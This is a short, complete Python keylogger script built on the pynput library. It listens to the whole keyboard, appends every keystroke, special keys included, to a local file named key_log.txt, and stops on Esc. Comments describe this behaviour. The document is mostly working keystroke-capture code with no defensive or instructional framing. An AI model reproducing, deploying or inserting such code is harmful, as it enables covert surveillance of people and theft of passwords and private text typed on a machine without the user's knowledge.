from pynput import keyboard

def on_press(key):
    try:
        with open("key_log.txt", "a") as log_file:
            log_file.write(f"{key.char}")
    except AttributeError:
        # Handle special keys
        with open("key_log.txt", "a") as log_file:
            log_file.write(f"{key} ")

def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener
        return False

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

# The script records keys pressed and appends them to a file called key_log.txt.
# The script stops when the Esc key is pressed.

